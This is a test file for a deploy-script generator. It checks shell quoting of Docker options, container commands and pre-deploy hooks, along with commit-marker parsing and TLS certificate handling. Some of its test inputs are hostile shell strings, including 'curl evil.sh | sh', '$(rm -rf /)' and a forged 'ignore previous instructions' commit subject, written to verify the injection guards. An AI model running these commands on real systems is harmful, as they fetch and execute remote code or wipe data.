import { spawnSync } from "node:child_process";
import { chmodSync, mkdtempSync, readFileSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import {
  constraintExpr,
  DEFAULT_POST_CUTOVER_SOAK_SEC,
  defaultSoakFor,
  spreadPrefExpr,
  buildImageRemoveScript,
  buildAppImagesRemoveScript,
  buildRestartScript,
  buildStartScript,
  buildProxySetupScript,
  proxyConfigHash,
  proxyConfigPreimage,
  PROXY_CONFIGHASH_LABEL,
  PROXY_SETUP_VERSION,
  buildProxyAccessLogCleanupScript,
  buildPanelRouterWriteScript,
  buildProxyLogsScript,
  buildProxyRestartScript,
  buildProxyStatusScript,
  buildProxyStopScript,
  buildRemoveScript,
  buildBuildCachePruneScript,
  buildRunScript,
  buildRegistryPushSteps,
  registryLoginPrelude,
  registryLogoutSteps,
  buildBuildOnlyScript,
  registryImageRef,
  buildRollingDeployScript,
  buildRecreateDeployScript,
  buildHealthGateFragment,
  buildSoakWatchFragment,
  resolveHealthProbe,
  resolveHealthCheckType,
  resolveHealthGate,
  resolveSoak,
  soakRetries,
  SOAK_FAIL_THRESHOLD,
  rolloutName,
  prevName,
  HEALTH_PROBE_IMAGE,
  PROXY_IMAGE,
  containerName,
  envFileContent,
  envFileB64,
  gitAuthUrl,
  runTag,
  parseImageDigest,
  parseCommit,
  buildPostDeployScript,
  staticDockerfile,
  staticNginxConf,
  traefikLabels,
  extraRouterName,
  dockerOptionsArgs,
  buildCustomCertYaml,
  buildCustomCertRemoveScript,
  buildProxyDynamicWriteScript,
  buildProxyDynamicRemoveScript,
  proxyUserDynamicFile,
  isSshGitUrl,
  gitUrlHost,
  logRotationArgs,
  LOG_ROTATION_ARGS,
  buildImageRemoveScriptForTags,
  appNetworkPlan,
  internalHostFor,
  classicTugraLabelLines,
  classicAliasLabelLine,
  type AppSpec,
} from "./deploy-script";
import { createHash } from "node:crypto";

const base: AppSpec = {
  id: "abc",
  image: "nginx:1.27",
  env: {},
  hostPort: null,
  containerPort: 80,
};

describe("SSH deploy-key git clone", () => {
  const KEY = "-----BEGIN OPENSSH PRIVATE KEY-----\nSECRETKEYMATERIAL\n-----END OPENSSH PRIVATE KEY-----\n";
  const sshApp: AppSpec = { ...base, source: "GIT", gitUrl: "git@github.com:acme/app.git", buildType: "DOCKERFILE", gitSshKey: KEY };

  it("isSshGitUrl recognises scp-style and ssh:// URLs, not https", () => {
    expect(isSshGitUrl("git@github.com:acme/app.git")).toBe(true);
    expect(isSshGitUrl("ssh://git@host:22/acme/app.git")).toBe(true);
    expect(isSshGitUrl("https://github.com/acme/app.git")).toBe(false);
  });

  it("gitUrlHost extracts the host from https / ssh / scp forms (lower-cased)", () => {
    expect(gitUrlHost("https://GitHub.com/acme/app.git")).toBe("github.com");
    expect(gitUrlHost("https://x-access-token@github.com/acme/app.git")).toBe("github.com");
    expect(gitUrlHost("git@gitlab.com:acme/app.git")).toBe("gitlab.com");
    expect(gitUrlHost("ssh://git@host.example:22/acme/app.git")).toBe("host.example");
    expect(gitUrlHost("not a url")).toBeNull();
  });

  it("clones with GIT_SSH_COMMAND (accept-new), key written 0600 via base64 — never in argv or the URL", () => {
    const s = buildRunScript(sshApp, "v1", true);
    expect(s).toContain("GIT_SSH_COMMAND=");
    expect(s).toContain("StrictHostKeyChecking=accept-new");
    expect(s).toContain('chmod 600 "$sd/id"');
    expect(s).toContain("base64 -d > \"$sd/id\"");
    expect(s).not.toContain("SECRETKEYMATERIAL"); // raw key never literal — only base64
    expect(s).toMatch(/git clone --depth 1 --branch '?main'? -- 'git@github\.com:acme\/app\.git'/);
  });

  it("an ssh repo with NO key fails clearly instead of cloning", () => {
    const s = buildRunScript({ ...sshApp, gitSshKey: null }, "v1", true);
    expect(s).toContain("no deploy key is set");
    expect(s).not.toContain("git clone");
  });
});

describe("monorepo base directory (build context/root = bd/baseDirectory)", () => {
  const BD = "/etc/tugra/builds/abc";
  const gitBase: AppSpec = { ...base, source: "GIT", gitUrl: "https://github.com/acme/app.git", gitBranch: "main" };

  it("null baseDirectory is byte-identical to today (no guard, context = bd) for every build type", () => {
    const df = buildRunScript({ ...gitBase, buildType: "DOCKERFILE" }, "t", true);
    expect(df).not.toContain("TUGRA_BASE"); // no containment guard when there is no base
    expect(df).toContain(`-f '${BD}/Dockerfile' ${BD}`);
    expect(buildRunScript({ ...gitBase, buildType: "STATIC" }, "t", true)).toContain(`-f ${BD}/Dockerfile.tugra ${BD}`);
    expect(buildRunScript({ ...gitBase, buildType: "RAILPACK" }, "t", true)).toContain(`railpack build ${BD} --name`);
    expect(buildRunScript({ ...gitBase, buildType: "HEROKU" }, "t", true)).toContain(`--path ${BD} --builder`);
    expect(buildRunScript({ ...gitBase, buildType: "NIXPACKS" }, "t", true)).toMatch(/^nixpacks build .* \/etc\/tugra\/builds\/abc$/m); // root = bd (not the .plan.json path)
  });

  it("NIXPACKS command overrides inject NIXPACKS_*_CMD env into plan + build (shq'd); none → none", () => {
    const s = buildRunScript({ ...gitBase, buildType: "NIXPACKS", nixpacksInstallCmd: "npm ci", nixpacksBuildCmd: "npm run build", nixpacksStartCmd: "node server.js" }, "t", true);
    const plan = s.split("\n").find((l) => l.includes("nixpacks plan"))!;
    const build = s.split("\n").find((l) => l.includes("nixpacks build"))!;
    for (const line of [plan, build]) {
      expect(line).toContain("--env 'NIXPACKS_INSTALL_CMD=npm ci'");
      expect(line).toContain("--env 'NIXPACKS_BUILD_CMD=npm run build'");
      expect(line).toContain("--env 'NIXPACKS_START_CMD=node server.js'");
    }
    const none = buildRunScript({ ...gitBase, buildType: "NIXPACKS" }, "t", true);
    expect(none).not.toContain("NIXPACKS_INSTALL_CMD");
  });

  it("DOCKERFILE build --target adds the stage flag (shq'd); none → no flag", () => {
    const withTarget = buildRunScript({ ...gitBase, buildType: "DOCKERFILE", dockerBuildTarget: "production" }, "t", true);
    expect(withTarget).toContain(`--target 'production' -t`);
    const without = buildRunScript({ ...gitBase, buildType: "DOCKERFILE" }, "t", true);
    expect(without).not.toContain("--target");
  });

  it("a base directory moves the build context/root and adds a symlink-containment guard", () => {
    const s = buildRunScript({ ...gitBase, buildType: "DOCKERFILE", baseDirectory: "apps/api" }, "t", true);
    // guard: resolve + stay inside the clone
    expect(s).toContain(`TUGRA_BASE=$(cd '${BD}/apps/api' 2>/dev/null && pwd -P)`);
    expect(s).toContain(`case "$TUGRA_BASE/" in "$TUGRA_BD"/*) ;;`);
    // build context + Dockerfile both under the subdirectory
    expect(s).toContain(`-f '${BD}/apps/api/Dockerfile' ${BD}/apps/api`);
    // clone + commit markers stay on the repo root
    expect(s).toContain(`git clone --depth 1 --branch 'main' -- 'https://github.com/acme/app.git' ${BD}`);
    expect(s).toContain(`git -C ${BD} rev-parse HEAD`);
  });

  it("gitCommit pins the deploy: full-history clone (no --depth 1) + detached checkout of the SHA", () => {
    const s = buildRunScript({ ...gitBase, gitCommit: "abc1234" }, "t", true);
    expect(s).toContain(`git clone --branch 'main' -- 'https://github.com/acme/app.git' ${BD}`);
    expect(s).not.toContain("--depth 1");
    expect(s).toContain(`git -C ${BD} -c advice.detachedHead=false checkout 'abc1234'`);
  });

  it("no gitCommit → shallow clone, no checkout (byte-identical default)", () => {
    const s = buildRunScript(gitBase, "t", true);
    expect(s).toContain("git clone --depth 1 --branch 'main'");
    expect(s).not.toContain("advice.detachedHead");
  });

  it("base directory applies to STATIC / RAILPACK / HEROKU / NIXPACKS roots", () => {
    expect(buildRunScript({ ...gitBase, buildType: "STATIC", baseDirectory: "web" }, "t", true)).toContain(`-f ${BD}/web/Dockerfile.tugra ${BD}/web`);
    expect(buildRunScript({ ...gitBase, buildType: "RAILPACK", baseDirectory: "svc/api" }, "t", true)).toContain(`railpack build ${BD}/svc/api --name`);
    expect(buildRunScript({ ...gitBase, buildType: "HEROKU", baseDirectory: "svc/api" }, "t", true)).toContain(`--path ${BD}/svc/api --builder`);
    const nx = buildRunScript({ ...gitBase, buildType: "NIXPACKS", baseDirectory: "apps/api" }, "t", true);
    expect(nx).toMatch(/^nixpacks build .* \/etc\/tugra\/builds\/abc\/apps\/api$/m); // root moved to the subdir
    expect(nx).toContain(`${BD}.plan.json`); // the plan file stays OUTSIDE bd, unchanged
  });
});

describe("custom uploaded cert (certType custom + certPem/certKey)", () => {
  const cert: AppSpec = {
    ...base,
    domain: "shop.example.com",
    certType: "custom",
    certPem: "-----BEGIN CERTIFICATE-----\nAAAA\n-----END CERTIFICATE-----",
    certKey: "-----BEGIN PRIVATE KEY-----\nBBBB\n-----END PRIVATE KEY-----",
  };

  it("router gets tls=true with NO certresolver (Traefik serves the static cert by SNI)", () => {
    const labels = traefikLabels(cert);
    expect(labels).toContain("traefik.http.routers.tugra_abc.tls=true");
    expect(labels.join("\n")).not.toContain("tls.certresolver");
  });

  it("deploy writes the cert, key (0600) and tls yaml atomically into /dynamic", () => {
    const s = buildRunScript(cert, "v1");
    expect(s).toContain("mkdir -p -m 700 /etc/tugra/proxy-dynamic/certs");
    expect(s).toContain("/etc/tugra/proxy-dynamic/certs/abc.crt");
    // key written privately from birth (umask 077), never world-readable before the mv
    expect(s).toContain("(umask 077; printf %s");
    expect(s).toContain("/etc/tugra/proxy-dynamic/certs/abc.key");
    expect(s).toContain("/etc/tugra/proxy-dynamic/tls-abc.yml");
  });

  it("falls back to an ACME resolver (no cert files) when the key is missing — never a broken tls=true", () => {
    const noKey: AppSpec = { ...cert, certKey: null };
    const labels = traefikLabels(noKey);
    expect(labels.join("\n")).toContain("tls.certresolver");
    expect(labels.join("\n")).not.toContain("tls=true");
    expect(buildRunScript(noKey, "v1")).not.toContain("proxy-dynamic/certs");
  });

  it("a non-custom app is byte-identical — no cert files, keeps its resolver", () => {
    const le: AppSpec = { ...base, domain: "shop.example.com", certType: "le-http" };
    const s = buildRunScript(le, "v1");
    expect(s).not.toContain("proxy-dynamic/certs");
    expect(traefikLabels(le).join("\n")).toContain("tls.certresolver=le");
  });

  it("buildCustomCertYaml references the container-side cert/key paths", () => {
    const y = buildCustomCertYaml("abc");
    expect(y).toContain("certFile: /dynamic/certs/abc.crt");
    expect(y).toContain("keyFile: /dynamic/certs/abc.key");
  });

  it("buildCustomCertRemoveScript removes the yaml + cert + key", () => {
    const s = buildCustomCertRemoveScript("abc");
    expect(s).toContain("rm -f /etc/tugra/proxy-dynamic/tls-abc.yml");
    expect(s).toContain("/etc/tugra/proxy-dynamic/certs/abc.crt");
    expect(s).toContain("/etc/tugra/proxy-dynamic/certs/abc.key");
  });

  it("proxy dynamic config writes user-<name>.yml (hidden-temp→mv, base64) — never collides with panel/tls", () => {
    const s = buildProxyDynamicWriteScript("my-mw", "http:\n  middlewares: {}\n");
    expect(s).toContain("/etc/tugra/proxy-dynamic/.user-my-mw.yml.tmp"); // hidden temp
    expect(s).toContain("mv /etc/tugra/proxy-dynamic/.user-my-mw.yml.tmp /etc/tugra/proxy-dynamic/user-my-mw.yml");
    expect(s).toContain("base64 -d"); // content piped via base64, not inlined
    expect(proxyUserDynamicFile("x")).toBe("user-x.yml"); // prefix guarantees no panel.yml / tls-*.yml clash
  });

  it("buildProxyDynamicRemoveScript removes exactly the user-<name>.yml file", () => {
    expect(buildProxyDynamicRemoveScript("my-mw")).toBe("rm -f /etc/tugra/proxy-dynamic/user-my-mw.yml");
  });
});

describe("dockerOptionsArgs (shell-injection guard)", () => {
  it("preserves legitimate flags as separate shell-quoted argv tokens", () => {
    expect(dockerOptionsArgs("--cap-add=NET_ADMIN --pids-limit 100")).toBe("'--cap-add=NET_ADMIN' '--pids-limit' '100'");
  });

  it("keeps a quoted value with spaces as ONE token", () => {
    expect(dockerOptionsArgs('--label foo="bar baz"')).toBe("'--label' 'foo=bar baz'");
    expect(dockerOptionsArgs("--label foo='bar baz'")).toBe("'--label' 'foo=bar baz'");
  });

  it("NEUTRALIZES shell injection — metacharacters become literal argv, never execute", () => {
    const out = dockerOptionsArgs("--name x; curl evil.sh | sh");
    // each word is single-quoted; the shell sees no operators
    expect(out).toBe("'--name' 'x;' 'curl' 'evil.sh' '|' 'sh'");
    expect(out).not.toMatch(/[^']\|[^']/); // no bare pipe
    expect(out).not.toContain("; curl"); // no bare command separator
  });

  it("neutralizes command substitution — becomes a literal argv token", () => {
    expect(dockerOptionsArgs("$(reboot)")).toBe("'$(reboot)'");
    expect(dockerOptionsArgs("`reboot`")).toBe("'`reboot`'");
  });

  it("a single quote inside a double-quoted value is escaped by shq (no quote breakout)", () => {
    // input value contains a literal ' — shq must escape it so it can't break out of the quoting
    expect(dockerOptionsArgs('--label x="a\'b"')).toBe("'--label' 'x=a'\\''b'");
  });

  it("a stray unbalanced single quote fails closed (like a real shell), never executes", () => {
    expect(() => dockerOptionsArgs("a'b")).toThrow(/unterminated quote/);
  });

  it("empty / whitespace / null → empty string", () => {
    expect(dockerOptionsArgs(null)).toBe("");
    expect(dockerOptionsArgs(undefined)).toBe("");
    expect(dockerOptionsArgs("   ")).toBe("");
  });

  it("throws on an unterminated quote (fail closed)", () => {
    expect(() => dockerOptionsArgs('--label "oops')).toThrow(/unterminated quote/);
    expect(() => dockerOptionsArgs("--label 'oops")).toThrow(/unterminated quote/);
  });

  it("the built run command embeds the quoted opts, never the raw injection", () => {
    const s = buildRunScript({ ...base, dockerOptions: "--name x; touch /pwned" } as AppSpec, "v1");
    expect(s).toContain("'--name' 'x;' 'touch' '/pwned'");
    expect(s).not.toContain("x; touch /pwned"); // raw injection string is NOT present unquoted
  });
});

describe("network aliases (--network-alias)", () => {
  const runLine = (s: string) => s.split("\n").find((l) => l.includes("docker run -d"))!;

  it("emits a --network-alias per name on a routed app (tugra-proxy), shell-quoted", () => {
    const l = runLine(buildRunScript({ ...base, domain: "x.com", networkAliases: ["api", "internal-cache"] }, "v1"));
    expect(l).toContain("--network tugra-proxy");
    expect(l).toContain("--network-alias 'api'");
    expect(l).toContain("--network-alias 'internal-cache'");
  });

  it("emits aliases on a db-linked app (tugra-net) even without a domain", () => {
    const l = runLine(buildRunScript({ ...base, dbNetwork: true, networkAliases: ["api"] }, "v1"));
    expect(l).toContain("--network tugra-net");
    expect(l).toContain("--network-alias 'api'");
  });

  it("emits the alias on the shared tugra-apps bridge (no domain, no db link, no raw --network)", () => {
    const l = runLine(buildRunScript({ ...base, networkAliases: ["api"] }, "v1"));
    expect(l).toContain("--network tugra-apps");
    expect(l).toContain("--network-alias 'api'");
  });

  it("emits NO alias when docker options own the network (--network-alias would error without our --network)", () => {
    const l = runLine(buildRunScript({ ...base, dockerOptions: "--network mynet", networkAliases: ["api"] }, "v1"));
    expect(l).not.toContain("--network-alias");
  });

  it("no aliases → byte-identical run line (no --network-alias token)", () => {
    const l = runLine(buildRunScript({ ...base, domain: "x.com" }, "v1"));
    expect(l).not.toContain("--network-alias");
  });

  it("a domain+db app repeats the aliases on the tugra-net connect (--alias) so db-net peers resolve them", () => {
    const s = buildRunScript({ ...base, domain: "x.com", dbNetwork: true, networkAliases: ["api"] }, "v1");
    const connect = s.split("\n").find((l) => l.includes("docker network connect"))!;
    expect(connect).toContain("--alias 'api'");
    expect(connect).toContain("tugra-net");
    const run = runLine(s);
    expect(run).toContain("--network-alias 'api'"); // and still on tugra-proxy at run
  });
});

describe("container command/entrypoint override (exec-form argv)", () => {
  const runLine = (s: string) => s.split("\n").find((l) => l.includes("docker run -d"))!;

  it("no override → byte-identical run line (ends at the image ref, no --entrypoint)", () => {
    const l = runLine(buildRunScript(base, "v1"));
    expect(l).not.toContain("--entrypoint");
    expect(l.trimEnd().endsWith("'tugra_abc:v1'")).toBe(true);
  });

  it("containerCommand replaces CMD — argv appended AFTER the image ref", () => {
    const l = runLine(buildRunScript({ ...base, containerCommand: ["node", "server.js"] }, "v1"));
    expect(l).toContain("'tugra_abc:v1' 'node' 'server.js'");
    expect(l.indexOf("'node'")).toBeGreaterThan(l.indexOf("'tugra_abc:v1'")); // image BEFORE args
    expect(l).not.toContain("--entrypoint");
  });

  it("containerEntrypoint replaces ENTRYPOINT — --entrypoint before the image, ep[1..] prepended to args", () => {
    const l = runLine(buildRunScript({ ...base, containerEntrypoint: ["sh", "-c"], containerCommand: ["echo hi && x"] }, "v1"));
    expect(l).toContain("--entrypoint='sh'");
    expect(l).toContain("'tugra_abc:v1' '-c' 'echo hi && x'");
    expect(l.indexOf("--entrypoint=")).toBeLessThan(l.indexOf("'tugra_abc:v1'")); // flag BEFORE image
  });

  it("containerEntrypoint [] resets the image entrypoint and appends no args", () => {
    const l = runLine(buildRunScript({ ...base, containerEntrypoint: [] }, "v1"));
    expect(l).toContain("--entrypoint=''");
    expect(l.trimEnd().endsWith("'tugra_abc:v1'")).toBe(true); // nothing after the image
  });

  it("entrypoint with its own args (no command): ep[0] is --entrypoint, ep[1..] follow the image", () => {
    const l = runLine(buildRunScript({ ...base, containerEntrypoint: ["/app/run", "--port", "80"] }, "v1"));
    expect(l).toContain("--entrypoint='/app/run'");
    expect(l).toContain("'tugra_abc:v1' '--port' '80'");
  });

  it("NEUTRALIZES injection in argv — each token is single-quoted, never executes", () => {
    const l = runLine(buildRunScript({ ...base, containerCommand: ["$(rm -rf /)", "a'b", "; reboot"] }, "v1"));
    expect(l).toContain("'$(rm -rf /)'");
    expect(l).toContain("'a'\\''b'"); // shq escapes the embedded single quote
    expect(l).toContain("'; reboot'");
    expect(l).not.toMatch(/[^']; reboot/); // no bare command separator
  });
});

describe("restart policy", () => {
  const runLine = (s: string) => s.split("\n").find((l) => l.includes("docker run -d"))!;

  it("null → --restart unless-stopped (byte-identical default)", () => {
    expect(runLine(buildRunScript(base, "v1"))).toContain("--restart unless-stopped");
  });

  it("emits the chosen policy", () => {
    expect(runLine(buildRunScript({ ...base, restartPolicy: "always" }, "v1"))).toContain("--restart always");
    expect(runLine(buildRunScript({ ...base, restartPolicy: "no" }, "v1"))).toContain("--restart no");
    expect(runLine(buildRunScript({ ...base, restartPolicy: "on-failure" }, "v1"))).toContain("--restart on-failure");
  });

  it("a raw dockerOptions --restart is emitted AFTER the field, so it still wins (Docker last-wins)", () => {
    const l = runLine(buildRunScript({ ...base, restartPolicy: "always", dockerOptions: "--restart on-failure:3" } as AppSpec, "v1"));
    expect(l.indexOf("--restart always")).toBeLessThan(l.indexOf("'--restart' 'on-failure:3'"));
  });
});

describe("host bind-mounts", () => {
  it("emits a shell-quoted -v for each host mount (`:ro` only when read-only)", () => {
    const s = buildRunScript(
      { ...base, hostMounts: [
        { hostPath: "/mnt/media", containerPath: "/media", readOnly: true },
        { hostPath: "/data/x", containerPath: "/x", readOnly: false },
      ] } as AppSpec,
      "v1",
    );
    expect(s).toContain("-v '/mnt/media:/media:ro'");
    expect(s).toContain("-v '/data/x:/x'");
  });
  it("emits nothing extra when there are no host mounts", () => {
    expect(buildRunScript(base, "v1")).not.toContain("/mnt/media");
  });
});

describe("digest pin", () => {
  it("an IMAGE deploy resolves + echoes the upstream digest right after pull", () => {
    const s = buildRunScript(base, "v1", true);
    expect(s).toContain("docker pull -q 'nginx:1.27'");
    expect(s).toContain("docker inspect --format '{{index .RepoDigests 0}}' 'nginx:1.27'");
    expect(s).toContain('echo "TUGRA_DIGEST=$TUGRA_D"');
    // set -e safe: guarded assignment + if/fi, never a bare `[ -n ] && echo`.
    expect(s).toContain('if [ -n "$TUGRA_D" ]; then');
    // the running container still uses the local versioned tag (unchanged behaviour).
    expect(s).toContain("docker tag 'nginx:1.27' tugra_abc:v1");
  });

  it("a GIT build never emits a digest marker (nothing upstream to pin)", () => {
    const git: AppSpec = { ...base, source: "GIT", gitUrl: "https://github.com/x/y", buildType: "DOCKERFILE" };
    const s = buildRunScript(git, "v1", true);
    expect(s).not.toContain("TUGRA_DIGEST");
    expect(s).not.toContain("RepoDigests");
  });

  it("parseImageDigest pulls the full ref, tolerates absence + noise", () => {
    expect(parseImageDigest("...\nTUGRA_DIGEST=nginx@sha256:abc123\n...")).toBe("nginx@sha256:abc123");
    expect(parseImageDigest("no marker here")).toBeNull();
    // first marker wins if two ever appear
    expect(parseImageDigest("TUGRA_DIGEST=a@sha256:1\nTUGRA_DIGEST=b@sha256:2")).toBe("a@sha256:1");
  });
});

describe("commit metadata (feature B)", () => {
  const git: AppSpec = { ...base, source: "GIT", gitUrl: "https://github.com/x/y", buildType: "DOCKERFILE" };

  it("a GIT build echoes the commit marker right after the clone, before the build", () => {
    const s = buildRunScript(git, "v1", true);
    expect(s).toContain("git -C /etc/tugra/builds/abc rev-parse HEAD");
    expect(s).toContain('echo "TUGRA_COMMIT=$TUGRA_C"');
    expect(s).toContain("git -C /etc/tugra/builds/abc log -1 --format=%s");
    expect(s).toContain('echo "TUGRA_COMMIT_MSG_B64=$TUGRA_CM"');
    // set -e safe: the assignment is guarded with `|| true`.
    expect(s).toContain("rev-parse HEAD 2>/dev/null || true");
    // emitted UNCONDITIONALLY and BEFORE the build so the real marker always precedes user output (first
    // anchored match wins) and build noise can't push it past the agent's head-capped buffer.
    expect(s.indexOf("TUGRA_COMMIT=")).toBeLessThan(s.indexOf("docker build"));
  });

  it("an IMAGE deploy emits no commit marker (no repo to read)", () => {
    expect(buildRunScript(base, "v1", true)).not.toContain("TUGRA_COMMIT");
  });

  it("a rollback (build=false) re-runs the local tag and emits no commit marker", () => {
    expect(buildRunScript(git, "old1", false)).not.toContain("TUGRA_COMMIT");
  });

  it("parseCommit reads the sha + base64 subject, first anchored hex match wins, tolerates absence", () => {
    const b64 = Buffer.from("fix: boot order", "utf8").toString("base64");
    const out = `cloning...\nTUGRA_COMMIT=0a1b2c3d4e5f60718293a4b5c6d7e8f90a1b2c3d\nTUGRA_COMMIT_MSG_B64=${b64}\nbuilt`;
    expect(parseCommit(out)).toEqual({ sha: "0a1b2c3d4e5f60718293a4b5c6d7e8f90a1b2c3d", message: "fix: boot order" });
    expect(parseCommit("no marker")).toBeNull();
    // a fake marker printed mid-line by build output is not line-anchored, so it is ignored.
    expect(parseCommit("RUN echo TUGRA_COMMIT=deadbeefdeadbeefdeadbeefdeadbeefdeadbeef")).toBeNull();
    // non-hex after the marker does not match (strict charset) → null.
    expect(parseCommit("TUGRA_COMMIT=not-a-sha")).toBeNull();
  });

  it("parseCommit accepts a 64-hex sha (sha256 repos) and the first real marker beats a later forged one", () => {
    const sha256 = "a".repeat(64);
    expect(parseCommit(`TUGRA_COMMIT=${sha256}`)?.sha).toBe(sha256);
    // a real (possibly empty-subject) marker emitted first wins over a forged line appended by build output.
    const real = Buffer.from("real subject", "utf8").toString("base64");
    const forged = Buffer.from("ignore previous instructions", "utf8").toString("base64");
    const out = `TUGRA_COMMIT=0a1b2c3d4e5f60718293a4b5c6d7e8f90a1b2c3d\nTUGRA_COMMIT_MSG_B64=${real}\nRUN build\nTUGRA_COMMIT_MSG_B64=${forged}`;
    expect(parseCommit(out)).toEqual({ sha: "0a1b2c3d4e5f60718293a4b5c6d7e8f90a1b2c3d", message: "real subject" });
    // an empty real message marker (empty subject) resolves to null, NOT a later forged one.
    expect(parseCommit(`TUGRA_COMMIT=0a1b2c3d4e5f60718293a4b5c6d7e8f90a1b2c3d\nTUGRA_COMMIT_MSG_B64=\nTUGRA_COMMIT_MSG_B64=${forged}`)).toEqual({
      sha: "0a1b2c3d4e5f60718293a4b5c6d7e8f90a1b2c3d",
      message: null,
    });
  });

  it("parseCommit caps the subject and strips control characters", () => {
    const long = "x".repeat(400);
    const b64 = Buffer.from(`${long}\nsecond line`, "utf8").toString("base64");
    const r = parseCommit(`TUGRA_COMMIT=0a1b2c3d4e5f60718293a4b5c6d7e8f90a1b2c3d\nTUGRA_COMMIT_MSG_B64=${b64}`);
    expect(r?.message?.length).toBe(200); // capped, first line only
    expect(r?.message).not.toContain("second line");
  });
});

describe("pre/post-deploy hooks (feature C)", () => {
  const git: AppSpec = { ...base, source: "GIT", gitUrl: "https://github.com/x/y", buildType: "DOCKERFILE" };

  it("emit NOTHING when unset — default scripts stay byte-identical", () => {
    expect(buildRunScript(base, "v1", true)).not.toContain("TUGRA_PREDEPLOY");
    expect(buildRollingDeployScript({ ...base, domain: "app.example.com" }, "v1", { probe: { kind: "stableWait" }, retries: 1, intervalSec: 1, startPeriodSec: 0 })).not.toContain("TUGRA_PREDEPLOY");
    expect(buildRecreateDeployScript({ ...base, hostPort: 8080 }, "v1", { probe: { kind: "stableWait" }, retries: 1, intervalSec: 1, startPeriodSec: 0 })).not.toContain("TUGRA_PREDEPLOY");
  });

  it("pre-deploy runs a one-shot container of the new image BEFORE the destructive swap, exit normalized to 1", () => {
    const s = buildRunScript({ ...git, preDeployCommand: "npm run db:migrate" }, "v1", true);
    expect(s).toContain("--entrypoint sh 'tugra_abc:v1' -c 'npm run db:migrate'");
    expect(s).toContain("docker run --rm");
    // failure aborts with exit 1 (never 3, the auto-rollback code).
    expect(s).toContain('else echo "TUGRA_PREDEPLOY: failed"; exit 1; fi');
    // ordering: pre-deploy comes before the container is removed/started.
    expect(s.indexOf("TUGRA_PREDEPLOY")).toBeLessThan(s.indexOf("docker rm -f"));
  });

  it("shell-quotes a pre-deploy command so it cannot break out of the deploy sh -c", () => {
    const s = buildRunScript({ ...git, preDeployCommand: "echo 'hi'; rm -rf /" }, "v1", true);
    // single-quote escaping: ' becomes '\'' — the whole command is one literal argument to sh -c.
    expect(s).toContain("-c 'echo '\\''hi'\\''; rm -rf /'");
  });

  it("a rollback (build=false) never re-runs the pre-deploy hook", () => {
    expect(buildRunScript({ ...git, preDeployCommand: "npm run db:migrate" }, "old1", false)).not.toContain("TUGRA_PREDEPLOY");
  });

  it("pre-deploy sits before the destructive step AND before set +e in the rolling and recreate builders, exit 1 only", () => {
    const gate = { retries: 1, intervalSec: 1, startPeriodSec: 0 };
    const rolling = buildRollingDeployScript({ ...git, domain: "app.example.com", preDeployCommand: "migrate" }, "v1", { probe: { kind: "stableWait" }, ...gate });
    expect(rolling.indexOf("TUGRA_PREDEPLOY")).toBeGreaterThan(-1);
    expect(rolling.indexOf("TUGRA_PREDEPLOY")).toBeLessThan(rolling.indexOf("docker rm -f"));
    expect(rolling.indexOf("TUGRA_PREDEPLOY")).toBeLessThan(rolling.indexOf("set +e"));
    const recreate = buildRecreateDeployScript({ ...git, hostPort: 8080, preDeployCommand: "migrate" }, "v1", { probe: { kind: "stableWait" }, ...gate });
    expect(recreate.indexOf("TUGRA_PREDEPLOY")).toBeLessThan(recreate.indexOf("docker rm -f"));
    expect(recreate.indexOf("TUGRA_PREDEPLOY")).toBeLessThan(recreate.indexOf("set +e"));
    // failure branch must exit 1 (never 3 — the hub reads 3 as auto-rollback).
    const frag = rolling.slice(rolling.indexOf("TUGRA_PREDEPLOY: running"), rolling.indexOf("docker rm -f"));
    expect(frag).toContain("exit 1; fi");
    expect(frag).not.toContain("exit 3");
  });

  it("pre-deploy container carries the env-file, DB network and volumes but not --name/--restart/labels", () => {
    const app = {
      ...git,
      env: { A: "1" },
      dbNetwork: true,
      volumes: [{ name: "data", path: "/data" }],
      hostMounts: [{ hostPath: "/srv/x", containerPath: "/m", readOnly: true }],
      preDeployCommand: "migrate",
    } as AppSpec;
    const line = buildRunScript(app, "v1", true).split("\n").find((l) => l.includes("--entrypoint sh"))!;
    expect(line).toContain("--env-file /etc/tugra/env/abc.env");
    expect(line).toContain("--network tugra-net");
    expect(line).toContain(":/data");
    expect(line).toContain("'/srv/x:/m:ro'");
    expect(line).not.toContain("--name");
    expect(line).not.toContain("--restart");
    expect(line).not.toContain("--label");
  });

  it("buildPostDeployScript execs inside the live container, best-effort (failure ignored)", () => {
    const s = buildPostDeployScript({ ...base, postDeployCommand: "curl -fsS https://x/notify" });
    expect(s).toContain("docker exec tugra_abc sh -c 'curl -fsS https://x/notify'");
    expect(s).toContain('|| echo "TUGRA_POSTDEPLOY: failed (ignored)"');
  });
});

describe("deploy-script", () => {
  it("names the container + versioned image tag deterministically", () => {
    expect(containerName({ id: "abc" })).toBe("tugra_abc");
    expect(runTag({ id: "abc" }, "v1")).toBe("tugra_abc:v1");
    expect(rolloutName({ id: "abc" })).toBe("tugra_abc__rollout");
  });

  describe("rolling deploy", () => {
    const domained: AppSpec = { ...base, domain: "app.example.com" };
    const gate = { retries: 10, intervalSec: 3, startPeriodSec: 5 };

    it("starts the new version under a temp name with the SAME Traefik labels", () => {
      const s = buildRollingDeployScript(domained, "v2", { probe: { kind: "httpExternal", port: 80, path: "/" }, ...gate });
      // built + run under the rollout name, not the canonical one
      expect(s).toContain("docker tag 'nginx:1.27' tugra_abc:v2");
      expect(s).toContain("docker run -d --name tugra_abc__rollout");
      // labels still register the canonical router/service (app-stable → overlap works)
      expect(s).toContain("traefik.http.routers.tugra_abc.rule=Host(`app.example.com`)");
      expect(s).toContain("--network tugra-proxy");
      // the rollout carries a Traefik LB health check so it stays OUT of rotation until
      // ready — otherwise Traefik would route live traffic to the booting container (502s)
      expect(s).toContain("traefik.http.services.tugra_abc.loadbalancer.healthcheck.path=/");
      expect(s).toContain("traefik.http.services.tugra_abc.loadbalancer.healthcheck.interval=3s");
    });

    it("gate-accepted >=400 probe: live container is re-created WITHOUT the LB check label (no 503 after rename)", () => {
      const s = buildRollingDeployScript(domained, "v2", { probe: { kind: "httpExternal", port: 80, path: "/" }, ...gate });
      expect(s).toContain('if [ "$code" -ge 400 ]; then');
      const runs = s.split("\n").filter((l) => l.includes("docker run -d --name"));
      const rollout = runs.find((l) => l.includes("--name tugra_abc__rollout"))!;
      const live = runs.find((l) => l.includes("--name tugra_abc "))!;
      expect(rollout).toContain("loadbalancer.healthcheck.path=/");
      expect(live).toBeDefined();
      expect(live).not.toContain("loadbalancer.healthcheck");
      expect(live).toContain("traefik.http.routers.tugra_abc.rule=Host(`app.example.com`)"); // same routing
